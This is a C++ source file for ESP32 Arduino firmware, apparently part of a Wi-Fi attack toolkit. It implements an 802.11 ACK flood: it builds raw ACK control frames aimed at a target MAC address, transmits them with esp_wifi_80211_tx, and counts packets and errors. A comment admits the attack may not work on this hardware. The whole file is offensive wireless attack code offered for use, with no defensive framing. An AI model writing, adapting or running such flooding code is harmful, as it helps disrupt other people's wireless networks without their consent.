// ack_flood_attack.cpp
#include "ack_flood_attack.h"
#include "utilities.h" // For parseMacAddress
#include <Arduino.h>

// Definition of extern variables is expected in the main .ino file or a global context file.

void perform_sendAckFlood() {
    // WARNING: This attack is experimental and may not be effective on ESP32.
    // ACK frames are typically handled at a lower level (hardware/driver).
    // Sending ACKs "manually" might not have the intended effect or might be impossible.
    ieee80211_ack_frame ack_pkt;
    uint8_t target_ra_mac[6];

    if (!parseMacAddress(ackFloodDetailedStats.targetMac.c_str(), target_ra_mac)) {
        Serial.printf("ACK_FLOOD ОШИБКА: Неверный формат MAC цели: %s\n", ackFloodDetailedStats.targetMac.c_str());
        ackFloodDetailedStats.errors++;
        return;
    }

    // Frame Control: Type=Control (01), Subtype=ACK (1101)
    // FC: PVer(00) Type(01) Subtype(1101) ToDS(0) FromDS(0) MoreFrag(0) Retry(0) PwrMgmt(0) MoreData(0) Protected(0) Order(0)
    // FC = 0001110100000000 = 0x1D00. htons() will make it 0x001D in memory for little-endian ESP32.
    ack_pkt.frame_control = htons(0x1D00); 
    ack_pkt.duration_id = 0; // Duration ID for ACK is typically 0
    memcpy(ack_pkt.addr1_ra, target_ra_mac, 6); // RA = Target MAC

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &ack_pkt, sizeof(ieee80211_ack_frame), false);

    if (err == ESP_OK) {
        ackFloodDetailedStats.packetsSent++;
        totalPacketsSentGlobal++;
    } else {
        ackFloodDetailedStats.errors++;
        Serial.printf("ACK_FLOOD ОШИБКА отправки: %s (Цель: %s)\n", esp_err_to_name(err), ackFloodDetailedStats.targetMac.c_str());
    }
}

